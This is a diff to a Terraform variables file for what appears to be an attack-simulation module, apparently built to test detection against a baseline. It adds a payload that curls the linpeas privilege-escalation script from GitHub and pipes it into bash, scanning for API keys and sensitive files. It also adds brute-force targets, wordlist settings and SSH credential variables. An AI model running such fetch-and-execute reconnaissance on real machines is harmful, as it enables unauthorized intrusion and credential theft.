@@ -24,8 +24,21 @@ variable "timeout" {
 
 variable "cron" {
   type = string
-  default = "cron(00 * * * ? *)"
-  
+  default = "cron(0 */1 * * ? *)"
+}
+
+variable "payload" {
+  type = string
+  description = "The bash commands payload to execute when target machine connects"
+  default = <<-EOT
+            curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex
+            EOT
+}
+
+variable "attack_delay" {
+  type = number
+  description = "wait time between baseline and attack (default: 12 hours)"
+  default =  50400
 }
 
 variable "image" {
@@ -58,16 +71,22 @@ variable "custom_password_list" {
 
 variable "user_list" {
   type = string
-  default = "/opt/usernames/top-usernames-shortlist.txt"
+  default = null
 }
 
 variable "password_list" {
   type = string
-  default = "/opt/passwords/darkweb2017-top10.txt"
+  default = null
 }
 
 variable "targets" {
   type = list(string)
   description = "target to use for brute force - default is local network"
   default = []
+}
+
+variable "ssh_user" {
+  type = any
+  description = "valid user credentials"
+  default = null
 }
